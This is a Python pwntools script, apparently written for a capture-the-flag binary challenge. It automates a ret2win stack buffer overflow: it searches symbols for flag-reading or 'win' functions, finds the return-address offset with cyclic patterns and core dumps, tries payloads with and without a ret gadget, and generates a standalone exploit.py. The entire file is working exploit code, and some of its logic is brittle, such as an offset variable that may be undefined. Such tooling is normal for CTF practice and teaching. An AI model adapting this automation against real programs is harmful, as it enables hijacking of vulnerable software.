from pwn import *
import sys
import os

def find_and_exploit(binary_path):
    context.binary = binary_path
    context.log_level = 'info'
    
    log.info(f"Targeting binary: {binary_path}")
    
    # Step 1: Find potential read_flag function
    elf = ELF(binary_path)
    potential_funcs = []
    
    # Look for read_flag in symbols
    log.info("Searching for read_flag function...")
    for sym in elf.symbols:
        if 'read' in sym.lower() and 'flag' in sym.lower():
            potential_funcs.append((sym, elf.symbols[sym]))
            log.success(f"Found symbol: {sym} at {hex(elf.symbols[sym])}")
    
    # Look for flag strings
    for section in elf.sections:
        if section.name == '.rodata':
            data = section.data()
            for i in range(len(data)):
                if b'flag' in data[i:i+10].lower():
                    # Find references to this string
                    for func in elf.functions:
                        for ref in elf.functions[func].references:
                            if ref >= section.header.sh_addr + i and ref < section.header.sh_addr + i + 10:
                                potential_funcs.append((func, elf.functions[func].address))
                                log.success(f"Found potential function: {func} at {hex(elf.functions[func].address)}")
    
    # If no potential functions found, look for any interesting functions
    if not potential_funcs:
        interesting_keywords = ['win', 'shell', 'secret', 'debug', 'admin', 'print']
        for sym in elf.symbols:
            for keyword in interesting_keywords:
                if keyword in sym.lower():
                    potential_funcs.append((sym, elf.symbols[sym]))
                    log.success(f"Found interesting function: {sym} at {hex(elf.symbols[sym])}")
                    break
    
    # If still no potential functions, fallback to provided address
    if not potential_funcs:
        read_flag_addr = 0x401f0f  # Fallback to the provided address
        potential_funcs.append(("read_flag", read_flag_addr))
        log.warning(f"No functions found, using fallback address: {hex(read_flag_addr)}")
    
    # Step 2: Find the buffer overflow offset
    log.info("Finding buffer overflow offset...")
    
    # Try with different pattern lengths
    for pattern_length in [100, 200, 400, 800]:
        log.info(f"Trying pattern length: {pattern_length}")
        
        # For 64-bit, use n=8 for the pattern
        pattern = cyclic(pattern_length, n=8)
        
        # Run with pattern and check for crash
        p = process(binary_path)
        p.sendline(pattern)
        
        try:
            p.wait_for_close(timeout=2)
        except:
            p.kill()
        
        # Check if we have a core dump
        if p.poll() != 0:
            try:
                core = p.corefile
                rip_value = core.rip
                
                # Try different methods to find the offset
                offset = None
                
                # Method 1: Standard cyclic_find
                try:
                    offset = cyclic_find(rip_value, n=8)
                    if offset < pattern_length:
                        log.success(f"Found offset using standard method: {offset}")
                        break
                except:
                    pass
                
                # Method 2: Look at the lower 4 bytes
                try:
                    offset = cyclic_find(rip_value & 0xffffffff, n=8)
                    if offset < pattern_length:
                        log.success(f"Found offset using lower 4 bytes: {offset}")
                        break
                except:
                    pass
                
                # Method 3: Convert to bytes and check
                try:
                    offset = cyclic_find(p64(rip_value)[:4], n=8)
                    if offset < pattern_length:
                        log.success(f"Found offset using byte conversion: {offset}")
                        break
                except:
                    pass
                
                if offset is None:
                    log.warning(f"Couldn't find pattern in RIP: {hex(rip_value)}")
                    
            except:
                log.warning("Couldn't analyze crash or create corefile")
        else:
            log.warning("Program didn't crash with this pattern length")
    
    # If offset is still None, try a brute force approach
    if offset is None:
        log.warning("Could not determine offset automatically. Trying brute force...")
        # Use a reasonable guess based on common buffer sizes
        offset = 64  # Common buffer sizes are often powers of 2
    
    log.info(f"Using offset: {offset}")
    
    # Step 3: Try each potential function
    for func_name, func_addr in potential_funcs:
        log.info(f"Trying function: {func_name} at {hex(func_addr)}")
        
        # Create payload
        payload = b"A" * offset + p64(func_addr)
        
        # Try with and without stack alignment
        for stack_align in [False, True]:
            if stack_align:
                log.info("Trying with stack alignment")
                # Add ret instruction address for stack alignment (typically a 'ret' gadget)
                ret_addr = 0
                for addr in elf.search(asm('ret')):
                    ret_addr = addr
                    break
                
                if ret_addr:
                    payload = b"A" * offset + p64(ret_addr) + p64(func_addr)
                else:
                    continue
            
            # Run exploit
            p = process(binary_path)
            p.sendline(payload)
            
            try:
                output = p.recvall(timeout=3)
                if b'flag' in output.lower() or b'{' in output and b'}' in output:
                    log.success(f"Success! Flag found with function {func_name}:")
                    log.success(output.decode('utf-8', errors='ignore'))
                    
                    # Generate clean exploit script
                    generate_exploit_script(binary_path, offset, func_addr, stack_align, ret_addr if stack_align else None)
                    return True
            except:
                pass
            
            p.close()
    
    log.failure("Could not find the flag automatically.")
    return False

def generate_exploit_script(binary_path, offset, func_addr, stack_align, ret_addr=None):
    """Generate a clean exploit script based on the findings"""
    script_name = "exploit.py"
    
    with open(script_name, "w") as f:
        f.write("#!/usr/bin/env python3\n")
        f.write("from pwn import *\n\n")
        f.write(f"# Target binary\n")
        f.write(f"binary = '{os.path.basename(binary_path)}'\n\n")
        f.write(f"# Connect to the process\n")
        f.write(f"p = process(binary)\n\n")
        f.write(f"# Buffer overflow offset: {offset}\n")
        f.write(f"offset = {offset}\n\n")
        f.write(f"# Target function address: {hex(func_addr)}\n")
        f.write(f"read_flag_addr = {hex(func_addr)}\n\n")
        f.write(f"# Craft payload\n")
        
        if stack_align and ret_addr:
            f.write(f"# Using stack alignment with ret gadget at {hex(ret_addr)}\n")
            f.write(f"ret_addr = {hex(ret_addr)}\n")
            f.write(f"payload = b'A' * offset + p64(ret_addr) + p64(read_flag_addr)\n\n")
        else:
            f.write(f"payload = b'A' * offset + p64(read_flag_addr)\n\n")
        
        f.write(f"# Send payload\n")
        f.write(f"p.sendline(payload)\n\n")
        f.write(f"# Get and print output\n")
        f.write(f"output = p.recvall()\n")
        f.write(f"print(output.decode('utf-8', errors='ignore'))\n")
    
    log.success(f"Exploit script written to {script_name}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <path_to_binary>")
        sys.exit(1)
    
    binary_path = sys.argv[1]
    find_and_exploit(binary_path)
